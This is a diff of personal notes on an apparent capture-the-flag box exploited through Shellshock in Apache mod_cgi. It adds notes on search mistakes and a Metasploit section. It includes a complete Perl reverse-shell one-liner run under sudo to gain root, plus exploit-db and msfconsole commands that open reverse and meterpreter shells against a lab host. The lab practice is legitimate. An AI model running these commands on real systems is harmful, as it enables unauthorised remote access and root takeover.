@@ -1,8 +1,16 @@
 # shocker, flow
 
-## summary
+## Summary
 
-+ hard to know the cgi shellshock vuln. (to know apache parse header as env, and the env parsing lead to a bash vulnerability.)
++ the msf keyword is not "apache 2.4.18", but *"apache cgi"*. Hence initially failed to pinpoint the info.
+
++ Hard to know the cgi shellshock vuln. (to know apache parse header as env, and the env parsing lead to a bash vulnerability.)
+
+> "With the discovered user.sh script, and due to the lack of another attack surface, it is quite clear at this point that the exploit will be shellshock (Apache mod_cgi).
+> There is a Metasploit module for this specific vulnerability, as well as a Proof of Concept on exploit-db."
+> (official write-up)
+
++ mistook `search` with `searchsploit`
 
 ## prev enum
 
@@ -98,4 +106,32 @@ sudo -l
 perl -e "system('echo 123')"
 sudo perl -e 'use Socket;$i="10.10.16.3";$p=1339;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
   # perl reverse shell -> root
+```
+
+## msf
+
+```sh
+msf> searchsploit apache cgi
+# Apache mod_cgi - 'Shellshock' Remote Command Injection                                                                   | linux/remote/34900.py
+
+python ./34900.py payload=reverse rhost=10.129.1.175 lhost=10.10.16.3 lport=1337 pages=/cgi-bin/user.sh
+  # 10.129.1.175> whoami
+  # shelly
+```
+
+```msfconsole
+msf> search apache cgi
+  # 2  exploit/multi/http/apache_mod_cgi_bash_env_exec      2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
+msf> use 2
+msf> show advanced
+msf> show options
+msf> set RHOSTS 10.129.1.175
+msf> set TARGETURI /cgi-bin/user.sh
+
+msf> show payloads
+  # 14 payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
+msf> set payload 14
+
+msf> run -j
+  # meterpreter user shell
 ```
